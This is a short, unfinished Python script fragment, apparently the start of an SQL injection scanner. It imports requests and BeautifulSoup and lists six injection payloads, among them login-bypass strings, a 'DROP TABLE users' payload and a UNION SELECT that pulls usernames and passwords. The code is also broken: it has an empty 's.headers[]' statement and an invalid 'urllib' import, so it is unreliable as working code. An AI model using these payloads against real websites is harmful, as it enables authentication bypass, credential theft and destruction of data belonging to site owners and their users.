import requests
import sys
from bs4 import BeautifulSoup
from urllib import urljoin

s = requests.Session()
s.headers[]
# Common SQL payloads for testing
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, null, null --",
    "' UNION SELECT username, password FROM users --",
]
